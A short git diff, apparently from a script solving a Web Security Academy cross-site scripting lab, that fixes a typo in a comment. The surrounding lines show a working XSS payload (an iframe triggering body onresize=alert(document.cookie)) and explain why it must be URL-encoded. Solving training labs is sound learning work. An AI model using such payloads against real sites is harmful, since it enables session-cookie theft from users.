@@ -22,7 +22,7 @@ payload = f"<iframe src=\"{lab_url_endpoint}/?search=%22%3E%3Cbody%20onresize=al
 # payload = (
 #     f'<iframe src="{lab_url_endpoint}/?search="><body onresize=alert(document.cookie)>"'
 # )
-# If i do not url in code the payload, then the server will html encode the output, thereby rendering the payload useless:
+# If i do not url encode the payload, then the server will html encode the output, thereby rendering the payload useless:
 # <textarea required rows="12" cols="300" name="responseBody">&lt;iframe src=&quot;https://ac091fdc1e4250b480b9a810001d00ba.web-security-academy.net/?search=&quot;&gt;&lt;body onresize=alert(document.cookie)&gt;&quot;</textarea>
 # Correct payload response body:
 # <textarea required rows="12" cols="300" name="responseBody">&lt;iframe src=&quot;https://ac091fdc1e4250b480b9a810001d00ba.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E&quot; onload=this.style.width=&apos;100px&apos;&gt;</textarea>
